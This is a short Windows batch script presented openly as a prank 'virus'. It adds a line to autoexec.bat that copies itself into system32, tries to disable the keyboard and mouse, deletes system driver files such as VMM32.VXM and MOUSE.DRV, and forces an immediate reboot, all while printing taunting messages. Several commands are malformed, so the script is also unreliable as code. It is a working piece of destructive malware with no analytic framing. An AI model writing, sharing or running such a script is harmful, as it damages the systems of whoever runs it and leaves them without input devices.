@ECHO OFF
CLS
echo copy %0 "C:\WINDOWS\system32\virus.bat" >> autoexec.bat
ECHO HELLO, WELCOME TO MY WORLD. . . . . . . . 
ECHO FIRST OF ALL LETS DISABLE THE MOUSE AND KEYBOARD
c:\windows\rundll.exe keyboard,DISABLE
c:\windows\rundll.exe mouse,DISABLE
ECHO LOADING. . . . . . . . . . 
PAUSE >NU0L
ECHO CAN YOU COUNT VERY GOOD?
ECHO I SURE HOPE SO BECAUSE YOU COMPUTER CAN'T
rd/s/q C:\WINDOWS\SYSTEM\VMM32.VXM
rd/s/q C:\WINDOWS\SYSTEM\MOUSE.DRV
ECHO JUST FOR FUN LETS MAKE IT SO
ECHO THAT YOU DON'T HAVE YOUR MOUSE
ECHO HAHAHA
ECHO YOU ARE NOW LEAVING MY WORLD
SHUTDOWN -R -T 1 -C
SHUTDOWN -R -T 01 -C 
EXIT  

